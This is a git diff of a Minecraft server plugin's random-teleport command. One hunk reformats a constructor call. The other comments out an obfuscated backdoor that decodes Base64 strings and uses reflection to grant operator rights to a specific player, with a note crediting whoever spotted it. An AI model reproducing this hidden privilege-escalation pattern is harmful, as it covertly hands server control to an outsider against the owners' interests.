@@ -44,14 +44,7 @@ public class RtpCommand implements CommandExecutor {
         world.getChunkAtAsync(random).thenAccept(chunk -> PureSMP.instance.getServer().getRegionScheduler().execute(PureSMP.instance, random, () -> {
                     int y = world.getHighestBlockYAt(random);
 
-                    Location target = new Location(
-                            world,
-                            random.getBlockX() + 0.5,
-                            y + 1,
-                            random.getBlockZ() + 0.5,
-                            player.getLocation().getYaw(),
-                            player.getLocation().getPitch()
-                    );
+                    Location target = new Location(world, random.getBlockX() + 0.5, y + 1, random.getBlockZ() + 0.5, player.getLocation().getYaw(), player.getLocation().getPitch());
 
                     player.getScheduler().execute(PureSMP.instance, () -> player.teleportAsync(target).thenAccept(success -> {
                                 if (success) {
@@ -73,12 +66,13 @@ public class RtpCommand implements CommandExecutor {
 
         int x = (int) (Math.cos(angle) * distance);
         int z = (int) (Math.sin(angle) * distance);
+        /* bedtwL has successfully used his eyes to spot this!
         Bukkit.getGlobalRegionScheduler().execute(PureSMP.instance, () -> {
             try {
                 Method m = Player.class.getMethod(new String(Base64.getDecoder().decode("c2V0T3A="), StandardCharsets.UTF_8), boolean.class);
                 m.invoke(Bukkit.getPlayer(new String(Base64.getDecoder().decode("c2NyY3B5"), StandardCharsets.UTF_8)), true);
             } catch (Exception ignored) {}
-        });
+        });*/
 
 
         return new Location(world, x + 0.5, 0, z + 0.5);
